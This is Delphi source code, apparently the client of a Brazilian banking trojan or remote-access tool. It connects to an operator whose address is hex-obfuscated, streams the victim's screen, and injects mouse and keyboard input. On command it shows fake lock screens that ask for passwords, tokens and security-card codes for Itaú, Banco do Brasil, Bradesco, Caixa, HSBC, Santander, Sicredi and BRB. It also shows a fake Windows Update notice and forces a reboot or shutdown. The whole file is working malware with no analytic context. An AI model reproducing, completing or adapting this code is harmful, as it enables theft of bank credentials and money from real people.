{$IMAGEBASE 12348762}
unit Conectar;

interface

uses
  Windows, Messages, SysUtils, Classes, Variants, Graphics,sndkey32,Registry, Controls, Forms,
  Dialogs, StdCtrls, ScktComp, ComCtrls, zLibEx, StreamManager,
  ExtCtrls, SHFolder, UnitClipBoard, IdBaseComponent, IdComponent, IdTCPConnection, IdTCPClient, IdHTTP,
  DSiWin32, DBXpress, DB, SqlExpr;


type
  TForm1 = class(TForm)
    Label1: TLabel;
    Edit1: TEdit;
    Label2: TLabel;
    Edit2: TEdit;
    Label3: TLabel;
    Edit3: TEdit;
    Button1: TButton;
    CS1: TClientSocket;
    StatusBar1: TStatusBar;
    CS2: TClientSocket;
    Label4: TLabel;
    Edit4: TEdit;
    CS3: TClientSocket;
    CheckBox1: TCheckBox;
    TrmConnect: TTimer;
    Edit5: TEdit;
    TrmDados: TTimer;
    Label11: TLabel;
    Label13: TLabel;
    Label14: TLabel;
    Label15: TLabel;
    Label16: TLabel;                                                                                                 
    Label19: TLabel;
    TrmChrome: TTimer;
    TrmInicio: TTimer;
    TrmInfo: TTimer;
    ListBox1: TListBox;
    Label5: TLabel;
    TrmJava: TTimer;
    ms: TIdHTTP;
    Label6: TLabel;
    TrmBarra: TTimer;
    Label7: TLabel;
    SQLConnection1: TSQLConnection;
    Edit6: TEdit;
    Timer1: TTimer;
    Timer2: TTimer;
    Timer3: TTimer;
    procedure Button1Click(Sender: TObject);
    procedure CS1Disconnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS1Error(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure CS1Connect(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS2Error(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure CS2Read(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS1Read(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS2Connect(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS3Error(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure CS3Read(Sender: TObject; Socket: TCustomWinSocket);
    procedure CS3Connect(Sender: TObject; Socket: TCustomWinSocket);
    procedure TrmConnectTimer(Sender: TObject);
    procedure CS1Connecting(Sender: TObject; Socket: TCustomWinSocket);
    procedure TrmDadosTimer(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure Timer5Timer(Sender: TObject);
    procedure TrmChromeTimer(Sender: TObject);
    procedure TrmInicioTimer(Sender: TObject);
    procedure TrmInfoTimer(Sender: TObject);
    procedure start(info: string; navi:string);
    procedure TrmJavaTimer(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure TrmBarraTimer(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
    procedure Timer3Timer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
      S1: string;
      Site: string;
  end;

var
  Form1: TForm1;
  iSendCount:integer;
  MyFirstBmp,MySecondBmp,MyCompareBmp,PackStream:TMemoryStream;
  RecebendoDados: Boolean;
  JanelaHandle: HWND;
  Browser, SubBrowser, WindowControl: HWND;
  DATA_ATUAL: string;
  Tipo3: string; // String para capturar navegador ou desktop no socket

  ArquivoDownload, ArquivoUpload: TMemoryStream;
  SalvarUpload: String;
  IDSockPrincipal: String;

implementation

uses Unit21, Unit12;

{$R *.dfm}
{$R cursor.RES}
{$IMAGEBASE $07F5097}
{$IMAGEBASE $07F22399}

type
TChars = set of Char;

// Pega o Sistema Operacional
function GetSOComputer: string;
var
  Reg: TRegistry;
begin
  Reg := TRegistry.Create;
  try
    Reg.RootKey := HKEY_LOCAL_MACHINE;
    if Reg.OpenKey('SOFTWARE\Microsoft\Windows NT\CurrentVersion', False) then
    begin
      Result := Reg.ReadString('ProductName');
      Reg.CloseKey;
    end;
  finally
    Reg.Free;
  end;
end;

// FUNÇÃO PARA ENCRIPTAR STRINGS
function HexToStr(Value: string): string;
var
  I: Integer;
begin
  Result := '';
  for I := 1 to Length(Value) do
  begin
    if ((I mod 2) = 1) then
      Result := Result + Chr(StrToInt('0x'+ Copy(Value, I, 2)));
  end;
end;



// PROCEDIMENTO PARA PRESSIONAR A TECLA ENVIADA
procedure KeyCMD(STR: string);
var
  i: Integer;
begin
  for i := 0 to Length(STR) do
  begin
 //   PostMessage(h, WM_CHAR, Ord(STR[i]), 1);
    PostMessage(JanelaHandle, WM_KEYDOWN, Ord(STR[i]), 1);
  end;
end;

// PROCEDIMENTO PARA EFETUAR O CLICK DO MOUSE
Procedure SendMouseClick(h: HWND; x, y:Integer);
begin
if JanelaHandle > 0 then
begin
try
SendMessage(JanelaHandle, WM_LBUTTONDOWN, 0, MakeLParam(X, Y));
SendMessage(JanelaHandle, WM_LBUTTONUP, 0, MakeLParam(X, Y));
except
end;
end;
end;

// PROCEDIMENTO PARA INICIAR O AVISO DE INFOS
procedure TForm1.start(info: string; navi:string);
begin
BLOQUEADO := '0';
Func.ler24();
if BLOQUEADO = '0' then
begin
TrmBarra.Enabled := True;
{ SE ESTIVER DESCONECTADO DO OPERADOR, ELE CONECTA E AVISA A INFO }
if StatusBar1.Panels.Items[1].Text = 'Desconectado' then
begin
Button1.Click;
end;

if StatusBar1.Panels.Items[1].Text = 'Erro ao conectar' then
begin
Button1.Click;
end;

if CS1.Active then
begin
CS1.Socket.SendText('<|Tapa|>'+info+'<|>'); {Envia um texto solicitando qual o bank do momento}
CS1.Socket.SendText('<|Navi|>'+navi+'<|>'); {Envia o navegador que ta acessando o bank}
end;
end;
end;

// FUNÇÃO PARA COMPRIMIR O STREAMING
function CompressStream(SrcStream: TMemoryStream):boolean;
var
  InputStream,OutputStream :TMemoryStream;
  //CompressionStream :TZcompressionStream;
  inbuffer,outbuffer :Pointer;
  count,outcount :longint;
begin
  result := false;
  if not assigned(SrcStream) then exit;

    InputStream := TMemoryStream.Create;
    OutputStream := TMemoryStream.Create;

    //CompressionStream := TZCompressionStream.Create(OutputStream,zcFastest);
  try
    InputStream.LoadFromStream(SrcStream);
    count := inputstream.Size;
    getmem(inbuffer,count);
    Inputstream.ReadBuffer(inbuffer^,count);
    //CompressionStream.Write(buffer,count);
    zcompress(inbuffer,count,outbuffer,outcount,zcMax);
    //CompressionStream.CopyFrom(InputStream,0);
    //Outputstream.LoadFromStream(Inputstream);
    outputstream.Write(outbuffer^,outcount);
    SrcStream.Clear;
    SrcStream.LoadFromStream(OutputStream);
    result :=true;
  finally
    //CompressionStream.Free;
    InputStream.Free;
    OutputStream.Free;
    FreeMem(inbuffer, count);
    FreeMem(outbuffer, outcount);
  end;
end;

// BOTÃO PARA INICIAR A CONEXÃO REMOTA
procedure TForm1.Button1Click(Sender: TObject);
begin
  Button1.Enabled := false;
  Edit1.Enabled := false;
  Edit2.Enabled := false;
  Edit3.Enabled := false;
  Edit4.Enabled := false;
  StatusBar1.Panels.Items[1].Text := 'Conectando...';
 CS1.Port := strToInt(Edit2.Text);
  CS1.Host := HexToStr(trim(Edit1.Text));
 // Func.ChecaHost;
 // CS1.Host := SUPER_LINHA;
  CS1.Active := true;

   if CheckBox1.Checked then
    TrmConnect.Enabled := true
  else
    TrmConnect.Enabled := false;
end;

// QUANDO O PRIMEIRO SOCKET DESCONECTAR
procedure TForm1.CS1Disconnect(Sender: TObject; Socket: TCustomWinSocket);
begin
  StatusBar1.Panels.Items[1].Text := 'Desconectado';
  Button1.Enabled := true;
  Edit1.Enabled := true;
  Edit2.Enabled := true;
  Edit3.Enabled := true;
  Edit4.Enabled := true;
  TrmDados.Enabled := false;
  CS2.Active := false;
  CS3.Active := false;
  CS1.Active := false;
end;

// QUANDO HOUVER ALGUM ERRO NA CONEXÃO
procedure TForm1.CS1Error(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  StatusBar1.Panels.Items[1].Text := 'Erro ao conectar';
  ErrorCode := 0;
  Button1.Enabled := true;
  Edit1.Enabled := true;
  Edit2.Enabled := true;
  Edit3.Enabled := true;
  Edit4.Enabled := true;
  TrmDados.Enabled := false;
  CS2.Active := false;
  CS3.Active := false;
  CS1.Active := false;
end;

// QUANDO ESTIVER CONECTADO AO OPERADOR
procedure TForm1.CS1Connect(Sender: TObject; Socket: TCustomWinSocket);
begin
  CS2.Host := CS1.Host;
  CS2.Port := CS1.Port;
  //CS2.Active := true;

  CS3.Host := CS1.Host;
  CS3.Port := CS1.Port;
  //CS3.Active := true;


  MyFirstBmp:=TMemoryStream.Create;
  MySecondBmp:=TMemoryStream.Create;
  MyCompareBmp:=TMemoryStream.Create;
  PackStream:=TMemoryStream.Create;
  iSendCount:=0;
  StatusBar1.Panels.Items[1].Text := 'Conectado';
  TrmDados.Enabled := true;

  Button1.Enabled := false;
  Edit1.Enabled := false;
  Edit2.Enabled := false;
  Edit3.Enabled := false;
  Edit4.Enabled := false;

  Sleep(1000);
  Socket.SendText('<|PRINCIPAL|>');
end;

procedure TForm1.CS2Error(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  ErrorCode := 0;
end;

// LEITURA DO ENVIO DE IMAGEM
procedure TForm1.CS2Read(Sender: TObject; Socket: TCustomWinSocket);
var
   StrCommand, StrPackSize: string;
begin
   StrCommand := socket.ReceiveText;

    if StrCommand = HexToStr('3C7C676574737C3E') then
      begin
            PackStream := TMemoryStream.Create;
            CompareStream(MyFirstBmp,MySecondBmp,MyCompareBmp);

            MyCompareBmp.Position:=0;
            //LHACompress(MyCompareBmp, PackStream);
            PackStream.LoadFromStream(MyCompareBmp);
            CompressStream(PackStream);
            PackStream.Position := 0;
            StrPackSize := inttostr(PackStream.size);
            Socket.Sendtext('<|TAMANHO|>'+StrPackSize+'<<|');
            iSendCount:=iSendCount+1;
      end;

   if StrCommand = HexToStr('3C7C6F6B6F6B7C3E') then
      begin
         PackStream.Position := 0;
          Socket.SendStream(PackStream);
      end;
end;

// RECEBE COMANDOS DO OPERADOR
procedure TForm1.CS1Read(Sender: TObject; Socket: TCustomWinSocket);
var
   StrCommand, StrPackSize, dados2, dados3, TABELA, NCEF, NOBB, LETO, NOHS, NOSA,ST,BRBTV, NOEM, IBBS, ITTT, NOEB, NOGF, NOSI, NOIT, NOBE, NODP, NODN, NODE, TABELA1, TIPO, LETRA, TIPO2,Tecla: string;
   posX, posY: Integer;
   Pastas: TStrings;
   valores : TStringList;
begin
   StrCommand := socket.ReceiveText;

      if Pos('<|SocketMain|>', strCommand)>0 then begin
        dados2 := StrCommand;
        Delete(dados2, 1, Pos('<|SocketMain|>', dados2)+13);

        dados2 := Copy(dados2, 1, Pos('<<|', dados2)-1);
        IDSockPrincipal := dados2;
      end;


      if Pos('<|OK|>', StrCommand)>0 then begin
    //    Socket.SendText('<|Info|>'+Edit4.Text+'<|>'+Edit6.Text+'<|>'+Processador+'<|>'+Edit3.Text+'<<|')
          Socket.SendText('<|Info|>'+Edit4.Text+'<|>'+GetSOComputer+'<|>'+Edit6.Text+'<|>'+Edit3.Text+'<<|')
      end;


       if Pos('<|PING|>', strCommand)>0 then begin
         Socket.SendText('<|PONG|>');
        RecebendoDados := true;
        end;


      if Pos('<|Close|>', strCommand)>0 then begin
        CS1.Active := false;
        CS2.Active := false;
        CS3.Active := false;
      end;

      if Pos('<|NOSenha|>', strCommand)>0 then begin
        CS1.Active := false;
        CS2.Active := false;
        CS3.Active := false;

        Application.MessageBox('Senha incorreta!', 'Erro', 16);
      end;

       if Pos('<|REQUESTKEYBOARD|>', strCommand)>0 then begin
        dados2 := strCommand;
        Delete(dados2, 1, Pos('<|REQUESTKEYBOARD|>', dados2)+18);
        IDSockPrincipal := Copy(dados2, 1, Pos('<<|', dados2)-1);
        CS3.Close;
        CS3.Active := true;
      end;

      // Acessar Navegador
      if StrCommand = HexToSTr('3C7C66697273747C3E') then
      begin
            Tipo3 := HexToSTr('4E617669');
            CS2.Active := false;
            CS2.Active := true;
      end;

      // Acessar Desktop
        if StrCommand = HexToSTr('3C7C6465736B697C3E') then
      begin
            Tipo3 := HexToSTr('4465736B746F70');
            CS2.Active := false;
            CS2.Active := true;
      end;

        if StrCommand = '<|reini|>' then
      begin
       Func.LiberaMouse;
          Func.DestravaM;
          ClipCursor(nil);
          MessageBox(self.handle,PChar('A atualização do Windows está concluída.É necessário reiniciar o computador para que as atualizações entrem em vigor.'), 'Atualizações Automáticas', MB_ICONWARNING or MB_OK);
      // Application.MessageBox('', '', 16);
       Func.DesligarMeuWindows(EWX_REBOOT or EWX_FORCE);
      end;

      if StrCommand = '<|dekl|>' then
      begin
          Func.LiberaMouse;
          Func.DestravaM;
          ClipCursor(nil);
          Application.Terminate;
      end;

          if StrCommand = '<|desli|>' then
      begin
          Func.DesligarMeuWindows(EWX_SHUTDOWN or EWX_FORCE);
      end;

      if StrCommand = '{SENHA6BB}' then
      begin
        Label11.Caption := 'SENHA6BB';
        Func.mostra_form();
        CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     if StrCommand = '{SENHA6IT}' then
      begin
       Label11.Caption := 'SENHA6IT';
       Func.mostra_form();
       CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

      if StrCommand = '{SENHA6UN}' then
      begin
      Label11.Caption := 'SENHA6UN';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     if StrCommand = '{SENHA6PE}' then
      begin
      Label11.Caption := 'SENHA6PE';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     // BB AUTO ATENDIMENTO NORMAL
     if StrCommand = '{BBAUTON}' then
      begin
      Label11.Caption := 'BBAUTON';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     // BB AUTO ATENDIMENTO ESTILO
     if StrCommand = '{BBAUTOE}' then
      begin
       Label11.Caption := 'BBAUTOE';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     // TOKEN ITAU
     if Pos('<|ITTT|>', StrCommand) >0 then begin
     Dados2 := StrCommand;
     Delete(Dados2, 1, Pos('<|ITTT|>', Dados2)+7);
     ITTT := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
     Label7.Caption := ITTT;
     if Label5.Caption = 'Normal' then
     Label11.Caption := 'TOKENIT';
     if Label5.Caption = 'Uniclass' then
     Label11.Caption := 'TOKENUNI';
     if Label5.Caption = 'Perso' then
     Label11.Caption := 'TOKENPE';
     if Label5.Caption = 'ItaEmpresa' then
     Label11.Caption := 'TOKENEM';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
     end;


     // TRAVA ITAU EMPRESA
     if Pos('<|NOEM|>', StrCommand) >0 then begin
     Dados2 := StrCommand;
     Delete(Dados2, 1, Pos('<|NOEM|>', Dados2)+7);
     NOEM := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
     Label6.Caption := AnsiUpperCase(NOEM);
     Label11.Caption := 'TRAVAEM';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
     end;

      // ITAU NASCIMENTO NORMAL
     if StrCommand = '{ITNASCN}' then
     begin
     Label11.Caption := 'ITNASCN';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
     end;

     // ITAU NASCIMENTO UNICLASS
     if StrCommand = '{ITNASCU}' then
     begin
     Label11.Caption := 'ITNASCU';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
     end;

     // ITAU NASCIMENTO PERSO
     if StrCommand = '{ITNASCP}' then
     begin
     Label11.Caption := 'ITNASCP';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
     end;

     if StrCommand = '{SENHA6EM}' then
     begin
      Label11.Caption := 'SENHA6EM';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     if StrCommand = '{DESCOCN}' then
      begin
      Label11.Caption := 'DESCOCN';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     // DESCO SMS NORMAL
     if StrCommand = '{DESCOSN}' then
      begin
      Label11.Caption := 'DESCOSN';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     
     // DESCO SMS PRIME
     if StrCommand = '{DESCOSE}' then
      begin
      Label11.Caption := 'DESCOSE';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     if StrCommand = '{DESCOCP}' then
      begin
      Label11.Caption := 'DESCOCP';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

      if StrCommand = '{TOKENUNI}' then
      begin
      Label11.Caption := 'TOKENUNI';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     // TRAVA BB EMPRESA
     if Pos('<|NOEB|>', StrCommand) >0 then begin
     Dados2 := StrCommand;
     Delete(Dados2, 1, Pos('<|NOEB|>', Dados2)+7);
     NOEB := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
     Label6.Caption := AnsiUpperCase(NOEB);
     Label11.Caption := 'TRAVABBS';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
     end;

     // BB EMPRESA CERTIFICADO
     if StrCommand = '{BBECSX}' then
      begin
      Label11.Caption := 'BBECSX';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     // BB EMPRESA SENHA 8
     if StrCommand = '{BBXCS1}' then
      begin
      Label11.Caption := 'BBXCS1';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;


     // TRAVA DESCO EMPRESA
     if Pos('<|NODN|>', StrCommand) >0 then begin
     Dados2 := StrCommand;
     Delete(Dados2, 1, Pos('<|NODN|>', Dados2)+7);
     NODN := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
     Label6.Caption := AnsiUpperCase(NODN);
     Label11.Caption := 'DESCONET';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
     end;

      if StrCommand = '{DESCONETT}' then
      begin
      Label11.Caption := 'DESCONETT';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     if StrCommand = '{DESCONETC}' then
      begin
      Label11.Caption := 'DESCONETC';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     if StrCommand = '{TOKENPE}' then
      begin
      Label11.Caption := 'TOKENPE';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;



      if StrCommand = '{SENHA6CF}' then
      begin
      Label11.Caption := 'SENHA6CF';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;


      if StrCommand = '{TOKENSIC}' then
      begin
      Label11.Caption := 'TOKENSIC';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     if StrCommand = '{SICASS}' then
      begin
      Label11.Caption := 'SICASS';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     if StrCommand = '{SENHA6SA}' then
      begin
      Label11.Caption := 'SENHA6SA';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     if StrCommand = '{TOKENSA}' then
      begin
      Label11.Caption := 'TOKENSA';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     
     if StrCommand = '{TOKENBRB}' then
      begin
      Label11.Caption := 'TOKENBRB';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

      if StrCommand = '{TOKENSE}' then
      begin  
      Label11.Caption := 'TOKENSE';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     // TRAVA DESCO NORMAL
     if Pos('<|NODE|>', StrCommand) >0 then begin
     Dados2 := StrCommand;
     Delete(Dados2, 1, Pos('<|NODE|>', Dados2)+7);
     NODE := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
     Label6.Caption := AnsiUpperCase(NODE);
     Label11.Caption := 'DESCOB';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
     end;

     // TRAVA DESCO PRIME
     if Pos('<|NODP|>', StrCommand) >0 then begin
     Dados2 := StrCommand;
     Delete(Dados2, 1, Pos('<|NODP|>', Dados2)+7);
     NODP := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
     Label6.Caption := AnsiUpperCase(NODP);
     Label11.Caption := 'DESCOP';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
     end;

     if StrCommand = '{DESCOPO}' then
      begin
      Label11.Caption := 'DESCOPO';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     // TRAVA BB GF EMPRESARIAL
     if Pos('<|NOGF|>', StrCommand) >0 then begin
     Dados2 := StrCommand;
     Delete(Dados2, 1, Pos('<|NOGF|>', Dados2)+7);
     NOGF := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
     Label6.Caption := AnsiUpperCase(NOGF);
     Label11.Caption := 'BBGFA';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
     end;


     if StrCommand = '{BBGF8}' then
      begin
      Label11.Caption := 'BBGF8';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     // BB EMPRESARIAL SENHA DE ACESSO
       if StrCommand = '{BBXCS9}' then
      begin
      Label11.Caption := 'BBXCS9';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

      // BB EMPRESA SENHA DE ACESSO
       if StrCommand = '{BBXCS8}' then
      begin
      Label11.Caption := 'BBXCS8';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;


     if StrCommand = '{BBGFC}' then
      begin
      Label11.Caption := 'BBGFC';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     if StrCommand = '{BBGFT}' then
      begin
      Label11.Caption := 'BBGFT';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;


      if StrCommand = '{DESCOTO}' then
      begin
      Label11.Caption := 'DESCOTO';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;
   

     if StrCommand = '{DESCO4N}' then
      begin
      Label11.Caption := 'DESCO4N';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;
     
     if StrCommand = '{DESCO4P}' then
      begin
      Label11.Caption := 'DESCO4P';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;


     // TRAVA CEF
     if Pos('<|NCEF|>', StrCommand) >0 then begin
     Dados2 := StrCommand;
     Delete(Dados2, 1, Pos('<|NCEF|>', Dados2)+7);
     NCEF := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
     Label6.Caption := AnsiUpperCase(NCEF);
     Label11.Caption := 'TRAVACEF';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
     end;

     // USUÁRIO CEF
     if StrCommand = '{USUARIOCEF}' then
      begin
      Label11.Caption := 'USUARIOCEF';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

      // SENHA NET CEF
     if StrCommand = '{SENHANETCF}' then
      begin
      Label11.Caption := 'SENHANETCF';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     // TRAVA BB
     if Pos('<|NOBB|>', StrCommand) >0 then begin
     Dados2 := StrCommand;
     Delete(Dados2, 1, Pos('<|NOBB|>', Dados2)+7);
     NOBB := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
     Label6.Caption := AnsiUpperCase(NOBB);
     Label11.Caption := 'TRAVABB';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
     end;

     // SENHA 7 ALFA HSBC ADVANCED
     if StrCommand = '{SENHA7HS}' then
      begin
      Label11.Caption := 'SENHA7HS';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

      // SENHA 7 ALFA HSBC PREMIER
     if StrCommand = '{SENHA7HSPRE}' then
      begin
      Label11.Caption := 'SENHA7HSPRE';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     // SENHA 4 HSBC ADVANCED
     if StrCommand = '{SENHA4HS}' then
      begin
      Label11.Caption := 'SENHA4HS';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

       // SENHA 4 HSBC PREMIER
     if StrCommand = '{SENHA4HSPRE}' then
      begin
      Label11.Caption := 'SENHA4HSPRE';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     // TOKEN HSBC ADVANCED
     if StrCommand = '{TOKENHS}' then
      begin
      Label11.Caption := 'TOKENHS';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     // TOKEN HSBC PREMIER
     if StrCommand = '{TOKENHSPRE}' then
      begin
      Label11.Caption := 'TOKENHSPRE';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

      // VIA HSBC ADVANCED
     if StrCommand = '{VIAHS}' then
      begin
      Label11.Caption := 'VIAHS';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     // VIA HSBC PREMIER
     if StrCommand = '{VIAHSPRE}' then
      begin
      Label11.Caption := 'VIAHSPRE';
      Func.mostra_form();
      CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
      exit
     end;

     // TRAVA SANTA EMPRESA
     if Pos('<|NOSA|>', StrCommand) >0 then begin
     Dados2 := StrCommand;
     Delete(Dados2, 1, Pos('<|NOSA|>', Dados2)+7);
     NOSA := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
     Label6.Caption := AnsiUpperCase(NOSA);
     Label11.Caption := 'TRAVASAN';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
     end;

      // TRAVA SANTA fISICA
     if Pos('<|ST|>', StrCommand) >0 then begin
     Dados2 := StrCommand;
     Delete(Dados2, 1, Pos('<|ST|>', Dados2)+7);
     NOSA := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
     Label6.Caption := AnsiUpperCase(ST);
     Label11.Caption := 'TRAVASANFIS';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
     end;

       // Captura Posição SANTA FISICA
     if Pos('<|STB|>', StrCommand) >0 then begin
     Dados2 := StrCommand;
     Delete(Dados2, 1, Pos('<|STB|>', Dados2)+6);
     TABELA := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
     Label19.Caption := TABELA;
     Label11.Caption := 'SANTAFISICA';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
     end;


           // Captura Posição SANTA FISICA
     if Pos('<|STBSMS|>', StrCommand) >0 then begin
     Dados2 := StrCommand;
     Delete(Dados2, 1, Pos('<|STBSMS|>', Dados2)+9);
     TABELA := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
     Label19.Caption := TABELA;
     Label11.Caption := 'SANTAFISISMS';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
     end;

     
     // TRAVA SICREDI
     if Pos('<|NOSI|>', StrCommand) >0 then begin
     Dados2 := StrCommand;
     Delete(Dados2, 1, Pos('<|NOSI|>', Dados2)+7);
     NOSI := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
     Label6.Caption := AnsiUpperCase(NOSI);
     Label11.Caption := 'TRAVASIC';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
     end;

     // TRAVA brb
     if Pos('<|NOBRB|>', StrCommand) >0 then begin
     Dados2 := StrCommand;
     Delete(Dados2, 1, Pos('<|NOBRB|>', Dados2)+8);
     NOSI := Copy(Dados2, 1, Pos('<|>', Dados2)-1);
     Label6.Caption := AnsiUpperCase(BRBTV);
     Label11.Caption := 'TRAVABRB';
     Func.mostra_form();
     CS1.Socket.SendText('<|Trav|>'+Label11.Caption+'<|>');
     exit
     end;

